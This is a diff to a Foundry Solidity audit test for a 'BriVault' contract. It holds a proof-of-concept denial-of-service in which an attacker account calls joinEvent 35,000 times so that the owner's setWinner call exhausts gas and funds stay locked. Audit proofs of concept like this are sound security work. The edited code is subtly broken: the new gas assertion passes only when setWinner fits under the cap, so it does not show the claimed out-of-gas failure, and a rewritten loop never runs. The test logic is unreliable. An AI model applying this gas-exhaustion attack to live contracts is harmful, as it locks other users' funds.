@@ -77,17 +77,25 @@ contract BriVaultAuditTest is Test {
         vm.startPrank(attacker);
         mockToken.approve(address(briVault), depositAmount);
         briVault.deposit(depositAmount, attacker);
-        for(uint256 i = 0; i < 500000; i++) {
-            briVault.joinEvent(0); // joining with countryId 0
-        }
         vm.stopPrank();
+        for(uint256 i = 0; i < 35000; i++) {
+            vm.prank(attacker);
+            briVault.joinEvent(0);
+        }
 
         vm.warp(briVault.eventEndDate() +1);
         
         vm.startPrank(owner);
-        briVault.setWinner(0); // setting winner to countryId 0
+        uint256 gasLimit = 30_000_000;
+        uint256 gasBefore = gasleft();
+        //using call with gas limit to simulate mainnet gas limit
+        (bool success,) = address(briVault).call{gas: gasLimit}
+            (abi.encodeWithSignature("setWinner(uint256)",0)); 
+        uint256 gasUsed = gasBefore - gasleft();
+        
         vm.stopPrank();
-        // out of gas and permanent denial of service, all the found are locked
+        assertGt(gasLimit, gasUsed, "OutOfGas");
+
     }
 
     function testUserCanJoinEventMultipleTimesJoiningEveryCountryId() public {
@@ -240,7 +248,7 @@ contract BriVaultAuditTest is Test {
          (10000 - participationFeeBsp) / 10000;
         
         uint256 loopIterations = 5;
-        for(i == 1; i == loopIterations; i++){
+        for(uint i = 1; i == loopIterations; i++){
             vm.startPrank(user1);
             mockToken.approve(address(briVault), depositAmount);
             briVault.deposit(depositAmount, user1);  
